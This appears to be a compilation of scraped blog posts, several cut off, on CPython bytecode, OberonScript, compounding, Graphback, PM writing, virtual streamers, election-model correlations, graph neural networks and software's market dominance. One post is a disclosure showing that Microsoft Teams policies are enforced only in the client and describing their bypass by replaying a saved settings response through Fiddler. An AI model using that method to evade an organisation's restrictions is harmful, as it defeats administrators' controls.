</code></pre></div><p>Fortunately (or unfortunately for some people), there is no easy way to extract the bytecode of a whole module if you don't have a <code>pyc</code> (bytecode cache) file. If you want to get the source code from a running Python process, you will need to extract the bytecode of each function, class, and module definitions as well as from some frame objects. After that, you will need to run it through one of the <a href="https://github.com/rocky/python-decompile3">decompilers</a>.</p><h3>Conclusion</h3><p>This article is a part of <a href="https://rushter.com/blog/tags/cpython/">CPython internals</a> series. It's hard to find a practical application to these techniques, but such language details are useful for people who perform security research or participate in CTF competitions. My previous articles on bytecode have helped people to get extra points in security competitions.</p></div></div>]]>

<h2>OberonScript</h2>
<p>Oberon Script is a scripting language and runtime system for building interactive Web Client applications. It consists of a compiler that translates the full Oberon language into JavaScript code, and a small runtime system that detects and compiles at load-time script sections written in Oberon Script.</p>
<p>It is a complete re-implementation from scratch of an earlier compiler that I built
while being with <a href="http://research.microsoft.com/">Microsoft Research</a>
in <a href="http://en.wikipedia.org/wiki/Cambridge">Cambridge</a>. For legal reasons I was unable to take the code with me
but I cleared the code by MSR's legal department for publication via <a href="http://research.microsoft.com/research/downloads/default.aspx">Microsoft Research's code posting tool</a>.
However, I left MSR before completing the process, hence the complete rewrite.</p>
<h3>Code</h3>
<p>The code of the compiler is available in its current, far from final version in source code (obviously...) for personal,
non-commercial and non-governmental use. The usual disclaimers apply.</p>
<p>A very minimal documentation is also available. I may merge it some time with the prettyprinted HTML version below.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
    <p>Most people don’t practice taking ideas seriously. I think it’s because most people don’t know how to. I didn’t either, until I stumbled upon an implication.</p>

<p>For example, what would it mean to take compounding seriously?</p>

<p>Ugh. I can feel your aversion. You’ve already heard so much about compounding, how it works, how it’s the eight wonder of the world, etc. etc.</p>

<p>But, familiarity is not the same as taking it seriously.</p>

<p>Say you start with $100, and every year, make 10% more. This compounds, since the extra money is a function of how much you already have. The more you have, the more you get. It’s a positive loop that keeps on increasing.</p>

<p>That’s the familiar interpretation. The earlier you start, the more money you’ll make.</p>

<p>To take this interpretation seriously would mean investing your earnings for a similar return. <a href="http://johnsalvatier.org/blog/2017/reality-has-a-surprising-amount-of-detail" target="_blank" rel="noopener">Reality has a surprising amount of detail</a>, and sometimes assumptions break. You don’t make 10% - which means you need to balance your investments somehow. That makes things complicated. However, this complication is not related to compounding.</p>

<p>Taking compounding seriously means taking it a step further. Your net worth is just one implication. What else compounds?</p>

<p>Your life experiences and knowledge. What would it mean to leverage compounding here?</p>

<p>If you’re taking compounding seriously, you’d learn the skills with the greatest return first. That means learning the broadest applicable skills you’d apply throughout your life first. That means learning how to think well - before learning the new fancy tech you want to learn.</p>

<p>Of course, sometimes you need a medium to learn the skill better. That makes sense: learn to think well via this new tech you wanted to learn. <a href="https://www.lesswrong.com/s/3HyeNiEpvbQQaqeoH" target="_blank" rel="noopener">Purposes are fragile</a> though, and it’s easy to get lost in the tool, instead of the overall goal.</p>

</figure>

<p>What makes this example so good is that you’re probably very familiar with compounding. What else are you familiar with, but haven’t realised you’re not taking seriously?</p>

<p>A good way to practice this is to ask this question: What are the implications of (idea) in (field of interest)?</p>

<p>For example, asking myself What are the implications of compounding for my self-directed knowledge base led to the above insight of learning broader skills first.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><header><p><time datetime="2020-10-01T00:00:00.000Z">October 1, 2020  · 6 min read</time></p><div><p><a href="https://twitter.com/PhelanEnda" target="_blank" rel="noreferrer noopener"><img src="https://avatars2.githubusercontent.com/u/11743717?s=460&amp;u=3fd43aed3b4b8eb706fed5719e179d23c9c47eb1&amp;v=4" alt="Enda Phelan"></a></p></div></header><section><p>We are excited to announce the <strong>official release of Graphback 1.0</strong>! This release is the end result of the amazing work and collaboration between the Graphback team and our community. </p><p>To each and every one of you who helped by using Graphback and providing us with invaluable feedback, and to those who contributed in code and issues - thank you! You are all stars, and we would not have gotten here without you.</p><h2>What is Graphback?</h2><p>Graphback is a Node.js runtime framework and toolkit to generate a production-ready GraphQL project. Graphback is a core extension of the GraphQL CLI, used to generate a set of queries, mutations and subscriptions for each of your data models and connects to the database of your choice, allowing you to focus on the business objectives of your application.</p><p><img alt="Graphback logo" src="https://graphback.dev/assets/images/logo-df65e28e87b32b8790bc7436dbeb52b6.png"></p><p>The generated API layer follows the <a href="https://graphqlcrud.org/" target="_blank" rel="noopener noreferrer">GraphQL CRUD</a> specification developed by the GraphQL community, providing a common pattern for querying your data, and enables interoperability between GraphQL libraries which also adopt these patterns.</p><p>On top of the core framework, Graphback comes with a number of additional utility libraries which can optionally be used to aid development, like GraphQL Migrations for automatic database migration from your schema, and GraphQL Serve to instantly start up a Graphback API in-memory from the command-line.</p><h2>Why not ${otherGraphqlLibrary} instead?</h2><p>But, you might ask, why not some other library instead? The GraphQL ecosystem is evolving quickly, with a growing number of frameworks and libraries. Why should I choose Graphback and GraphQL CLI?</p><h3>No vendor lock-in</h3><p>The open design of Graphback and GraphQL CLI means there will be no vendor lock-in. You have full control over your code and you can easily extend, customise and replace to suit your use cases.</p><h3>Open Source, forever</h3><p>Graphback is, and always will be, 100% open source. We actively work with and use feedback from our awesome community to help drive Graphback in the right direction, and will continue to do so forever more.</p><h3>Committed to improving the GraphQL ecosystem</h3><p>One of our main philosophies is to ensure Graphback coexists and works with as many other GraphQL libraries and standards as possible, improving the overall experience for developers. Some of the libraries that Graphback works with:</p><ul><li><a href="https://graphql-cli.com/" target="_blank" rel="noopener noreferrer">GraphQL CLI</a> - Graphback helps to power the GraphQL CLI</li><li><a href="https://www.graphql-tools.com/" target="_blank" rel="noopener noreferrer">GraphQL Tools</a></li><li><a href="https://graphql-config.com/" target="_blank" rel="noopener noreferrer">GraphQL Config</a></li><li><a href="https://graphql-code-generator.com/" target="_blank" rel="noopener noreferrer">GraphQL Code Generator</a></li><li><a href="https://graphqlcrud.org/" target="_blank" rel="noopener noreferrer">GraphQL CRUD</a> - an open specification for common operations on top of GraphQL</li></ul><h3>Easy to use, easier to stay</h3><p>We tried to make Graphback as easy to use as possible. Whether you are highly experienced with GraphQL, or Graphback is your first venture into the world of GraphQL, we wanted to make it easy for you to add Graphback to your project and get up and running. You can bootstrap your server with Graphback through a couple of programmatic APIs.</p><div><div><div tabindex="0"><div><p><span>import</span><span> </span><span>{</span><span> buildGraphbackAPI</span><span>,</span><span> createCRUDService </span><span>}</span><span> </span><span>from</span><span> </span><span>'graphback'</span><span>;</span><span></span></p><p><span></span><span>import</span><span> </span><span>{</span><span> createKnexDbProvider </span><span>}</span><span> </span><span>from</span><span> </span><span>'@graphback/runtime-knex'</span><span>;</span><span></span></p><p><span></span><span>import</span><span> </span><span>{</span><span> </span><span>PubSub</span><span> </span><span>}</span><span> </span><span>from</span><span> </span><span>'graphql-subscriptions'</span><span>;</span><span></span></p><p><span></span><span>import</span><span> </span><span>Knex</span><span> </span><span>from</span><span> </span><span>'knex'</span><span>;</span><span></span></p><p><span></span><span>const</span><span> db </span><span>=</span><span> </span><span>Knex</span><span>(</span><span>...</span><span>)</span><span>;</span><span></span></p><p><span></span><span>const</span><span> </span><span>{</span><span> typeDefs</span><span>,</span><span> resolvers</span><span>,</span><span> contextCreator </span><span>}</span><span> </span><span>=</span><span> </span><span>buildGraphbackAPI</span><span>(</span><span>modelDefs</span><span>,</span><span> </span><span>{</span><span></span></p><p><span>  serviceCreator</span><span>:</span><span> </span><span>createCRUDService</span><span>(</span><span>{</span><span> pubSub</span><span>:</span><span> </span><span>new</span><span> </span><span>PubSub</span><span>(</span><span>)</span><span> </span><span>}</span><span>)</span><span></span></p><p><span>  dataProviderCreator</span><span>:</span><span> </span><span>createKnexDbProvider</span><span>(</span><span>db</span><span>)</span><span></span></p><p><span></span><span>}</span><span>)</span><span>;</span><span></span></p><p><span></span><span>const</span><span> apolloServer </span><span>=</span><span> </span><span>new</span><span> </span><span>ApolloServer</span><span>(</span><span>{</span><span></span></p><p><span>  typeDefs</span><span>,</span><span></span></p><p><span>  resolvers</span><span>,</span><span></span></p><p><span>  context</span><span>:</span><span> contextCreator</span></p><p><span></span><span>}</span><span>)</span><span>;</span></p></div></div></div></div><h3>GraphQL CRUD out of the box</h3><p>The Graphback team is a founding contributor of the GraphQL CRUD specification.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
          <p><span>Do you have "exceptional communication skills"? Well, it is a requirement in every product manager job description. Writing is a core part of a PM's job. Be it emails, documents, status updates. </span></p> <p><span>In this article, I distilled the principles and tactics collected from masters of the craft of writing in various domains. If it sounds too simple or basic, that means I've done my job.</span></p> <p><span>Enjoy.</span></p>  <p><h3><span>Keep It Simple</span></h3></p> <p><span>In written communication at work, your objectives are clarity and persuasion. If you remember just one thing from this post: keep it simple. </span></p> <p><span>In the words of </span> <a href="https://dilbertblog.typepad.com/the_dilbert_blog/2007/06/the_day_you_bec.html" target="_blank"><span>Scott Adams</span></a> <span>: </span> <em>"A good argument in five sentences will sway more people than a brilliant argument in a hundred sentences. Don’t fight it."</em></p> <p><span>Style is a small part of writing well, especially in a work setting. Focus on getting your point across.</span></p>  <p><h3><span>Miscommunication is Costly</span></h3></p> <p><span>Miscommunication is costly. And the reader likely </span> <em>won't tell you</em> <strong> </strong> <span>if they don't understand what you are saying. They will just ignore it, or interpret it the way they think is right. As the saying goes, "it's not what you say, it's what people hear".</span></p> <p><span>You can't persuade someone if they don't even understand you. Worse yet, misunderstanding among your stakeholders can lead to the wrong product being built. And that is expensive.</span></p> <p><span>Make your point as easy as possible to understand. </span></p>  <p><h3><span>Help the Reader Out</span></h3></p> <p><span>Everyone is busy. That's why people are much more likely to skim than to peruse your writing. </span></p> <p><span>Make your writing easy to parse. Optimize the content for scanning. Break up your walls of text, because no one will read them. Use more bullet points, whitespace, and clear headings.</span></p> <p><span>Just get your point across. And help your stakeholders move on with their day. </span></p>  <p><h3><span>Use Simple Words</span></h3></p> <p><span>Avoid words that would require the reader to reach for the dictionary, because most won't. And when they don't understand the word, they either skip it or guess it. </span></p> <p><span>Your job isn't to sound smart or write poetry. Your job is to communicate effectively to ship successful products.</span></p>  <p><h3><span>Use Fewer Words</span></h3></p> <p><span>Write with an eraser in hand. Messages with fewer words are easier to understand.</span></p> <p><span>In the words of George Orwell: "if it is possible to cut a word out always cut it out."</span></p> <p><span>Examples of words to cut out: "really", "very", "amazing", and adjectives in general. Chances are, the additional words won't add to your point. </span></p>  <p><h3><span>Use Short Sentences</span></h3></p> <p><span>Don't put more than one idea in each sentence. One sign that you are doing this wrong is having run-on sentences with lots of commas. To combat that, try using a period where you would normally use a comma.</span></p>  <p><h3><span>Use Visuals</span></h3></p> <p><span>Include visuals in your written communication where possible. Paint a vivid picture for the reader. This could mean diagrams, charts, or even sketches that illustrate your point.</span></p> <p><span>It both makes your message easier to understand, and it is </span> <a href="https://informedpm.com/posts/persuasion-product-manager" target="_blank"><span>more persuasive</span></a> <span>. </span></p>  <p><h3><span>Order Matters</span></h3></p> <p><span>In written communication, you present a sequence of ideas in a particular order. And that order matters.</span></p> <p><span>Make your point early on. Your first sentence or two should grab the reader. Because again, people are busy. Is this something they would want to keep reading? </span></p> <p><span>The order also affects how the reader's brain understands the message. As a rule of thumb, we are faster at understanding active voice than passive voice in English. </span></p> <p><span>Once you are done writing, re-read it (preferably aloud) to check the flow.</span></p>  <p><h3><span>Provide Context</span></h3></p> <p><span>As the reader reads your writing, one thought question that they always have is "Why should I care?" The answer to that question should be clear. Establish this early.</span></p> <p><span>Hyperlinks are helpful for packing more context to your writing without taking up additional space. Link to shared documents where possible in case your stakeholders need more information. This saves some back-and-forth questions and keeps the source of truth easier to maintain.</span></p>  <p><h3><span>Repeat the Important Points</span></h3></p> <p><span>Because the reader is likely to skim, repeat the important points in case they missed them. And the down-side is limited. When the reader scans something they already read, they will just filter it out.</span></p> <p><span>The repetition doesn't need to take place in the same document either. You can repeat in the form of follow-ups, reminders, summaries etc.</span></p> <p><span>As a bonus side effect, repetition is </span> <a href="https://informedpm.com/posts/persuasion-product-manager" target="_blank"><span>persuasive</span></a> <span>. </span></p>  <p><h3><span>Bold Words, Sparingly</span></h3></p> <p><span>Use contrast to make the key pieces of information pop, by bolding or highlighting keywords. This makes your writing easier to scan. </span></p> <p><span>Don't overdo it though. If everything is important, nothing is.</span></p>  <p><h3><span>Further Readings</span></h3></p>

			<p>Administrators can use teams policies for controlling what users can do in Microsoft Teams.</p>

<p>In this blog, I’ll show that these policies are applied only in client and thus can be easily bypassed.</p>





<p>Policies are used in Microsoft Office 365 and Azure AD for securing access to services and data. Besides the <a href="https://docs.microsoft.com/en-us/microsoft-365/security/office-365-security/identity-access-policies?view=o365-worldwide" target="_blank">common identity and device access policies</a>,
Microsoft has provided a set of <a href="https://docs.microsoft.com/en-us/microsoft-365/security/office-365-security/teams-access-policies?view=o365-worldwide" target="_blank">Teams specific policies</a>:</p>

<ul>
<li>Teams and channel policies</li>
<li>Messaging policies</li>
<li>Meeting policies</li>
<li>App permission policies</li>
</ul>

<p>For example, administrators can configure Teams so that external users are not able to edit or delete any messages they’ve sent. Or, an owner of a Teams site can disable message editing for members of a certain channel.</p>



<h2 id="initial-discovery">Initial discovery</h2>

<p>While I was working with the previous version (v0.4.4) of <a href="https://o365blog.com/aadinternals" target="_blank">AADInternals</a> Teams functions I noticed an interesting thing: I was able to edit and delete chat messages using AADInternals as a guest
even when it was not allowed.</p>

<p>This led to a question that <strong>what if the policies are applied only at the client end?</strong> In practice this would mean that the Teams service tells to your Teams client that “Though shall not edit messages!” but the client
could still do so.</p>

<h2 id="observing-teams-client-behaviour">Observing Teams client behaviour</h2>

<p>I started by watching what was going on between the client and cloud when the Teams client started. The first observation was that the client made about 120 http requests to the cloud.
While browsing through those requests, I spotted one that caught my interest (headers stripped):</p>

<pre><code>POST https://teams.microsoft.com/api/mt/part/emea-02/beta/users/useraggregatesettings HTTP/1.1

{
    "tenantSettingsV2": true,
    "userResourcesSettings": true,
    "messagingPolicy": true,
    "clientSettings": true,
    "targetingPolicy": true,
    "tenantSiteUrl": true,
    "userPropertiesSettings": true,
    "callingPolicy": true,
    "meetingPolicy": true,
    "educationAssignmentsAppPolicy": true
}
</code></pre>

<p>The response contained all the settings and policies the Teams client is allowed to do as the logged in user. Below can be seen the <strong>messagingPolicy</strong> section:

<p>What we can learn here is that the Teams client asks from the cloud what the current user is allowed to do, which was the expected behaviour.</p>

<h2 id="testing-in-action">Testing in action</h2>

<p>Next I decided to try whether I could lie to Teams client:</p>

<ol>
<li><p>I saved the response from above to be used as a baseline.</p></li>

<li><div><p>I created a new Messaging policy to disable editing and deleting of sent messages.</p><p>
I applied the policy to a single demo user:</p><p>
<img src="https://o365blog.com/images/posts/teams-policies1.png" alt="Custom policy"></p><p>Now I had two policies, the default organisation wide and the restricted one for demo user:</p><p>
<img src="https://o365blog.com/images/posts/teams-policies2.png" alt="Policies"></p></div></li>

<li><p>I restarted the Teams client and noticed that the editing and deleting were correctly disabled (didn’t exists).</p></li>

<li><div><p>I compared the returned policies from the <strong>useraggregatesettings</strong> requests<br>
and as we can see, the request was missing two lines:</p><p>
<img src="https://o365blog.com/images/posts/teams-policies3.png" alt="Policy comparison"></p></div></li>

<li><div><p>I closed the client and configured Fiddler to do an autoresponse using the saved http response from above:</p><p>
<img src="https://o365blog.com/images/posts/teams-policies4.png" alt="Fiddler autoresponse"></p><p>
Now, when the client is requesting the settings file, it will be served the one that allows editing and deleting.</p></div></li>

<li><p>I started the Teams client and <strong>the editing and deleting were again allowed</strong> and I was able to edit and delete (my own) messages!</p></li>
</ol>

<p>What we can lean here is that <strong>we can lie to Teams client</strong> and change its behaviour 😂 <br>
Moreover, we learnt that <strong>Teams policies are applied only on the client</strong> 🤦‍♂</p>

<p>Here is the video demonstrating this with <strong>AADInternals</strong> and <strong>Fiddler</strong> (sorry for the bad audio after 03:20):</p>

<div><iframe width="560" height="315" src="https://www.youtube.com/embed/Zcqig-OyUMY" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>
</div>

<p>Below is a video that shows in action that this works also with <strong>cloud file storage restrictions</strong>:<br></p>

<p><iframe width="560" height="315" src="https://www.youtube.com/embed/a32TkLIBwS4" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>
<br><strong>Note:</strong> Although not seen on the video, I was able to add my Google Drive account to Teams so this is not just a UI thing.</p>



<p>As far as I know, the “uncompliant” Teams client behaviour can not be detected.</p>

<p>Same verdict with protecting. Well, one could try to use Conditional Access (CA) with device ownership and compliance restrictions, but that doesn’t cover all scenarios.</p>



<p>Our little test here proves that <strong>Teams policies are applied ONLY on the client!</strong>.</p>

<p>If the user (or guest) is utilising Teams APIs directly, using for instance AADInternals <a href="https://o365blog.com/aadinternals/#teams-functions" target="_blank">Teams functionality</a>, he or she can bypass the restrictions set by the policies.
However, this is not a bug or vulnerability as such, but a (very very bad) design choice by Microsoft.</p>

<p>Users can do at least the following:</p>

<ul>
<li>Bypass messaging policies</li>
<li>Bypass cloud file storage restrictions</li>
<li>Bypass meetings policies</li>
</ul>

<p>⚠️ <strong>Teams policies are NOT a security measure and organisations should not rely on them!</strong> ⚠️</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Feel Good Inc. by Gorillaz was my first experience with a “virtual band”. Virtual bands, virtual YouTubers, and virtual streamers are all the same concept; the people creating and performing are not the focus. CGI characters are replacing humans, even outside of animation.&nbsp;</p><p>Virtual performers are not new. Alvin and the Chipmunks are the earliest example. Other notable Western examples include Dethklok and Crazy Frog.</p><p>Japan and the East, unsurprisingly, love virtual performers. Hatsune Miku is one of the most popular. She has widely attended live concerts. K/DA is a virtual K-pop group composed of characters from Riot’s League of Legends that has also seen enormous global success.</p><p id="youtube2-YSyWtESoeOc" data-attrs="{&quot;videoId&quot;:&quot;YSyWtESoeOc&quot;,&quot;startTime&quot;:null,&quot;endTime&quot;:null}"><iframe src="https://www.youtube-nocookie.com/embed/YSyWtESoeOc?rel=0&amp;autoplay=0&amp;showinfo=0" frameborder="0" gesture="media" allow="autoplay; fullscreen" allowautoplay="true" allowfullscreen="true"></iframe></p><p>Virtual streaming was really kicked off in 2016 by Kizuna AI. Kizuna plays video games just like other streamers, but she is entirely virtual. Body movements are likely motion captured or pre animated. Her voice is a paid actress. She embodies many cutesy anime girl tropes.&nbsp;</p><p>Previously, streaming was dominated by young men on Twitch in the West, which didn’t appeal to Eastern audiences. Japan was already primed because of their penchant for virtual idols. Kizuna likely uses the same freeware, MikuMikuDance, as Hatsune Miku.</p><p id="youtube2-3AK24prZk-k" data-attrs="{&quot;videoId&quot;:&quot;3AK24prZk-k&quot;,&quot;startTime&quot;:null,&quot;endTime&quot;:null}"><iframe src="https://www.youtube-nocookie.com/embed/3AK24prZk-k?rel=0&amp;autoplay=0&amp;showinfo=0" frameborder="0" gesture="media" allow="autoplay; fullscreen" allowautoplay="true" allowfullscreen="true"></iframe></p><div><p>The Japanese popularity of virtual streamers has influenced a new generation of Twitch streamers. Streamers like projektmelody (NSFW) and BuffPup do well in their niches. The vast majority of virtual streamers follow the trail blazed by virtual idols and Kizuna AI. Typically they are young female anime avatars that speak Japanese.</p><p>BuffPup stands out. BuffPup is one of the earliest virtual streamers to branch out from its anime roots into furry fandom. I’ll let you look that one up if you’re unfamiliar. Virtual streaming is clearly still in its infancy. Expressiveness of many virtual streamers is lacking, which leaves a huge opportunity for the right tech to push the medium forward.

This market alone will be enormously profitable, since it can leverage existing live streaming monetization techniques.</p><p>Gaming companies will double down into motion capture and face filter-like technologies. They’ll branch into AI generated voice tech, or acquire it. Once the tech gets there, virtual streaming will be an extremely high margin business, because even the talent will be fully automated.

  <!-- <time>2020-10-25</time> -->
  


<p><a href="https://projects.fivethirtyeight.com/2020-election-forecast/">538</a> and the <a href="https://projects.economist.com/us-2020-forecast/president">Economist</a> have both released detailed data from their election forecasts, listing how each state votes in 40,000 simulations of the presidential election. To understand some unusual scenarios from the 538 model, like every state <a href="https://twitter.com/gelliottmorris/status/1300480869082292225">voting for Biden but New Jersey</a>, Andrew Gelman <a href="https://statmodeling.stat.columbia.edu/2020/10/24/reverse-engineering-the-problematic-tail-behavior-of-the-fivethirtyeight-presidential-election-forecast/">examined the correlation</a> in the Trump vote share between pairs of several states. </p>
<p>I was curious what the whole universe of pairwise correlations looked like; you can click on a grid cell below to see voting patterns in two states in more detail along with the electoral maps from individual simulation scenarios. In the 538 model, 242 pairs of states are <span>negatively correlated</span>!</p>


<p>Mousing around the edges of the scatter plot pulls out more unusual scenarios, like Trump losing everywhere but <code>CA-HI-VT</code>. </p>
<p>On the correlation matrices, it appears that both models have identified similar groups of states. A scatter plot shows this directly: </p>


<p>Outside of the <code>CA-DC-VT-WA</code> and <code>LA-MS-ND-KY</code> clusters, where the 538 correlation dips below 0, the models are mostly aligned. Glancing over the outliers, it looks like the Economist might not have an equivalent to 538’s <a href="https://fivethirtyeight.com/features/how-fivethirtyeights-2020-presidential-forecast-works-and-whats-different-because-of-covid-19/">regional regression</a> that groups states in the same geographic region together; the Economist has <code>HI</code> at 0.2 correlation with <code>WA</code> &amp; <code>OR</code>  while 538 has it around 0.7.</p>
<p>Stepping back from the funky correlation charts, comparing the Trump vote share state by state clearly shows a bigger difference between the models: the <span>Economist model</span> considers really surprising outcomes, like Trump decisively winning <code>CA</code>, less likely than the <span>538 model</span>.</p>


<p>I haven’t followed the extensive discussion around election modeling closely enough to have a strong opinion on what all of this means, but it does look like the 538 model is allowing for the <a href="https://twitter.com/Nate_Cohn/status/1320043524771991560">possibility</a> of a broad <a href="https://twitter.com/NateSilver538/status/1300825856072454145">realignment in politics</a>–something you’d want to incorporate when modeling 2024 today, but not plausible for an election next week with <a href="https://www.nytimes.com/interactive/2020/us/elections/absentee-ballot-early-voting.html">sixty million ballots</a> already cast.</p>
<div id="notes">
<p>Only 5,000 scenarios are shown on the scatter plots; the scenarios are a snapshot from 2020-10-25 and not updated (looking at the correlations over time might be interesting though!). The rendered electoral college scenarios ignore the possibility of <code>NE</code> or <code>ME</code> spliting their votes. 

</p><p>The correlations matrix orders states by clustering on 538’s correlations. Sorting using the Economist correlations <a href="https://i.imgur.com/JH9FC8I.png">splits up</a> the negative 538 correlations.

<p>The power of networks. Metaphors of our collective life, with all of its complexity and its entangled dependencies.
Two types of networks, the network of data and the network of artificial neurons when combined together open the way to a variety of interesting applications. Typical examples of data networks include social networks and the knowledge graphs, while, on the other hand, a new family of machine learning tasks based on neural networks has grown in the last few years. This lineage of deep learning techniques lay under the umbrella of graph neural networks (GNN) and they can reveal insights hidden in the graph data for classification, recommendation, question answering and for predicting new relations among entities. Do you want to know more about them?</p>
<p>When we talk of machine learning tasks, we refer to a set of algorithms that finds correlation between input and output. The input is basically a list of numbers also known as vectorized features:</p>
<table>
<thead>
<tr>
<th>Symbol</th>
<th>Vector representation</th>
</tr>
</thead>
<tbody>
<tr>
<td>hiking</td>
<td>0.12, 0.25, 0.66, 0.45</td>
</tr>
<tr>
<td>mountain</td>
<td>0.16, 0.29, 0.62, 0.40</td>
</tr>
<tr>
<td>seaside</td>
<td>0.02, 0.70, 0.39, 0.60</td>
</tr>
</tbody>
</table>
<p>The vector representation of the nodes in the knowledge graph should preserve, to the maximum extent, the information carried by the single node within its own attributes compressed in a low dimensional space. In other words, the embeddings (the name of the vectorized representation) should identify the related symbol with a vector, and such vectors should be as small as possible. The objective of this article is about to find a proper way to generate good embeddings out of knowledge graphs.</p>
<p>For being useful in downstream machine learning tasks, embeddings should not just identify the related symbol but also they should have an important property. Symbols that are similar to each other – for whatever criteria we define for ‘similarity’ – should be associated with embeddings that are also similar, according to the favorite distance functions. In the above example, Hiking embeddings are more closely related to Mountain rather than Seaside. Embeddings are very familiar for those practiced in <a href="https://gfrison.com/categories/#nlp">natural language processing</a>, and they are based on the principle <em>“a word is characterized by the company it keeps (R. Firth)”</em>, and the skip-gram technique is employed for predicting what is the most likely word surrounded by a given set of predecessors and successors. Applied to a huge corpora, the trained skip-gram (or its complementary cbow) network will contain the embeddings that fulfill the similarity property. While the words in a text are strictly in sequential order (with one predecessor and one successor), in a graph a node might hold a multitude of relations, and as if that is not enough, those relations might be different one to another.</p>
<p>Representation learning is flourishing and new approaches are invented at an increasing rate:</p>
<figure>
<img src="https://gfrison.com/assets/images/gcn/File.jpg" alt="Tecniques for generating embeddings with neural networks">
<figcaption>Tecniques for generating embeddings with neural networks</figcaption>
</figure>
<p>Hereafter, I will present just two techniques for generating embeddings in graphs. For the sake of statistics, I implemented Deepwalk and Graph convolutional networks (GCN) in Scala with ND4J for matrices, and Deeplearning4J as a neural network framework.</p>

<p>The Deepwalk (and its successor Node2Vec) is an unsupervised algorithm, one of the first in the realm of representation learning for graphs, and it is as simple in its design as it is effective on capturing topological and content information. In principle it is equivalent to the already mentioned skip-gram, but how can the graph structure match the streaming sequence of words in a text? Starting from any node of choice, the algorithm visits its neighbors and the entire network in a controlled random way. The random walk is balanced among two different approaches that emphasize differences in closely related nodes in one case, and the differences among distant clusters in the other. The first approach is the Breadth First Search (BFS) which selects the next node to visit among the siblings of the current node, in the respect of the previous node. The second approach is the Deep First Search (DFS) that selects the new node among the connected nodes with the current one. The first persists with all neighbors of the current node, while the second tends to explore the network in depth.</p>

<figcaption>Clusterization on Karate dataset with Deepwalk</figcaption>
</figure>

<p>The graph convolutional networks, as the name might recall, share some commonalities with the convolutional neural network algorithm, the one that led the way to giant leaps in visual recognition. If a graph with nodes and edges is transposed in a two dimensional adjacent matrix, nothing can prevent us from running a sliding window function that compresses a grid of pixels and extracts features like CNNs do. The affinity with CNN ends here, because when we elaborate images we are more interested in complex visual features rather than single pixels. In knowledge graphs, on the other hand, we want to convolute in a single node its neighbours and recursively the information of the entire network.</p>

<p>The principle underlying GCNs lay its fundations on a method described several decades ago in the Weisfeiler-Lehman test. The test would determine whether two arbitrary graphs are isomorphic, i.e. they have exactly the same structure. According to the algorithm, all nodes are initialized with the same value, let’s put number 1 for all. Then, to that node is assigned that value plus the value of its neighbors, and this step is iterated. As you might think, in the first round the node already includes the information of first degree neighbors, but at the second iteration, the node will get a distilled notion of the second line of nodes, and so on as the iterations proceed. The test will confirm the isomorphism whether, after an arbitrary number of iterations, the partition of nodes by their current value does not change. Even though the isomorphism problem is not yet solved and the test is an heuristic attempt, the method brings the way to iteratively convolve information among the nodes.</p>

<p>The GCN method is described in Kipf &amp; Welling (ICLR 2017) and lies in the messaging passing methods family, whereas with “message” we intend solely the content of a single node and “passing” is the convolution which percolates throughout the network. While in the Weisfeiler-Lehman test the way to pass information is just a simple sum of values, in GCNs the convolution relies on the spectral propagation rule. What is this propagation rule? Let’s assume we know the graph structure (nodes and relations) and the content of all nodes (features). The propagation rule is applied with a linear matrix multiplication, but for not incurring in vanishing or exploding gradients in the downstream tasks, the features are normalized and a self-loop in the adjacency matrix is added.</p>

<p>I created some experiments with the small karate dataset, a fake set of node features (just a diagonal matrix) and a random set of weights. I repeated 4 experiments in sequence (no cherry-picking) in the image below where the color of the nodes indicates their similarity after running 2 iterations of the spectral algorithm.</p>

<figcaption>2 Iterations with Spectral Propagation Rule. Each figure is a separated run</figcaption>
</figure>
<p>The results are clearly amazing! The two clusters are yet unrefined but as you can see the figure (d) is almost exactly what we obtained with Deepwalk! Those embeddings are elaborated with just random weights and 2 recursive iterations. Why not apply some learning mechanism for refining the clusterization with few examples?</p>

<p>I started this post on how your e-commerce could recommend new items according to your customers’ holiday preferences and I’ll run some experiments with a more pertinent dataset. If you are not familiar with ConceptNet, it is a huge graph database of general facts with 34 millions nodes, 34 types of different relations that I converted entirely in a OWL database. I extracted approximately 3 thousands of nodes about our topics of interest, the mountain and the seaside. Then I created a 2-layered neural network with the spectral propagation rule. I fed it with the adjacency matrix, the word-embeddings of the node names as input features and some labelled nodes. Two nodes classified as “seaside” category, and two nodes classified as “mountain” category. The 4 labelled nodes with 2 categories is all I need for classifying all the rest of the 3 thousands labels. That’s a ratio of 4/3000 labelled entries in the respect of the entire dataset, isn’t interesting? That’s why the name semi-supervised learning.</p>
<figure>

<figcaption>ConceptNet snapshot. Red nodes are labelled “mountain”, the blue are “seaside”. 5 epochs</figcaption>
</figure>
<p>This method of classification is really fast but has some drawbacks. The spectral propagation rule takes into account the adjacency matrix which is the whole network in a two dimensional vector. For a relatively small dataset that’s not an issue, but when it comes with real big data this method is actually unfeasible. The FastGCN comes into the rescue and scales to big sized graph DBs.</p>

                    <p>People often say that software is eating the world. But have you ever wondered what that really means?</p><p>Ten years ago, software eating the world might have been hard to believe. In 2008, only one of the top ten companies in the S&amp;P 500 was a tech company: Microsoft. </p><p>Today, all five of the top five companies in the S&amp;P 500 are tech companies. Their combined market cap is <a href="https://www.startribune.com/the-s-p-500-has-never-been-more-top-heavy/572106152/">22% of the entire index</a>. Or as much as the bottom 363 companies combined. They are so dominant, lawmakers want to <a href="https://www.wsj.com/articles/house-panel-calls-for-congress-to-break-up-tech-giants-11602016985">break them up</a>.</p><p>How did this happen? And what happens next?</p><p>What role did software play in this outcome? And what does it mean for the future of financial services?</p><p>To understand what's really happening, you need to unpack the <a href="https://a16z.com/2011/08/20/why-software-is-eating-the-world/">software eats the world hypothesis</a> and understand why digital is different and the implication this has on value chains everywhere.</p><p>In a <a href="https://a16z.com/2019/08/16/software-eaten-world-healthcare/">2019 interview</a>, Marc Andreessen describes in three layers how the software eats the world hypothesis unfolds across industries. Layer one is:</p><!--kg-card-begin: markdown--><blockquote>
<p>Any product or service in any field that can become a software product, will become a software product.</p>
</blockquote>
